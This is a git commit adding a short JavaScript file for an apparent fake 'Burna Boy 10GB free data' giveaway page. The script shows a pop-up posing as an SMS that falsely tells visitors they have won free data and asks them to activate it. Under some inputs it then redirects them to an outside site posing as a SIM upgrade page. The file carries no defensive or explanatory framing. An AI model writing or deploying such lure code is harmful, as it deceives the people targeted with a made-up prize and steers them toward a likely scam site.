58042172588eaf6d50a1e1f1d859299a036fca2e
harryjohnson86 <mfonjohnson86@gmail.com>
2025-03-01 03:51:03 -0800

    Create burnaboy-10gbdata-giveaway.com.js

---
+++ burnaboy-10gbdata-giveaway.com.js
@@ -0,0 +1,5 @@
+var password = 'Burna Boy 10GB Free Data'
+password=prompt('SMS: Congratulations To All 10,000 Fans Your Number is Eligible to receive 10GB Free Data Burna Boy Giveaway , Kindly Press OK to ACTIVATE. ','Burna Boy 10GB Free Data');
+if (password != 'Burna Boy 10GB Free Data') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
